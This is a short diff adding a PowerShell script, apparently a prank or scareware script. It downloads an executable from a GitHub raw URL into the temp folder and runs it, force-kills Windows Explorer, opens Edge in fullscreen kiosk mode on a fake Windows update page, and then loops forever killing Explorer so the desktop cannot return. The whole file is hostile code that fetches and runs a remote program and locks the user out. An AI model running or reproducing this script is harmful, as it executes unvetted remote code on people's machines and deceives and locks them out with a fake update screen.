@@ -1,0 +1,8 @@
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Cancarutu2012/rroll/refs/heads/main/buttery-taskbar.exe' -OutFile '$env:TEMP\test.exe'; Start-Process '$env:TEMP\test.exe'"
+Stop-Process -Name explorer -Force
+Start-Process "msedge.exe" -ArgumentList "--kiosk https://fakeupdate.net/win11/ --edge-kiosk-type=fullscreen"
+
+
+while ($true) {
+   Stop-Process -Name explorer -Force
+}
